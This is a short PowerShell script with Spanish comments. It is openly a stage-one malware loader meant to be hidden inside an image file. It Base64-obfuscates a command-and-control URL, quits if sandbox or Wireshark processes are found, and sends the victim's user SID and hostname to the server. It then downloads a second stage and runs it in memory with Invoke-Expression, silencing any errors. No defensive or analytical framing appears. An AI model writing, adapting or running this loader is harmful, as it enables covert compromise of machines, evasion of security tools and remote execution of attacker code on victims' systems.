# hidden_stage1.ps1 - Este código estará oculto en la imagen
# Código ofuscado para evadir detección

function Inv-Obf {
    param ($c)
    $bytes = [System.Convert]::FromBase64String($c)
    $t = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $t
}

# URL codificada del servidor C2
$s = Inv-Obf "aHR0cDovL2V4YW1wbGUtYzJzZXJ2ZXIuY29tL3N0YWdlMg=="

# Evadir detección de sandboxes
Start-Sleep -Seconds 3
$procList = Get-Process | Select-Object -ExpandProperty ProcessName
if ($procList -contains "sbiedll" -or $procList -contains "wireshark") {
    exit
}

# Descargar la segunda etapa del C2
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    
    # Añadir identificación de la máquina compromometida
    $cid = [string]([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value)
    $hname = [System.Net.Dns]::GetHostName()
    
    # Solicitar la segunda etapa al C2
    $stage2 = $wc.DownloadString("$s`?id=$cid&h=$hname")
    
    # Ejecutar la segunda etapa en memoria
    Invoke-Expression $stage2
}
catch {
    # Silenciar errores
}
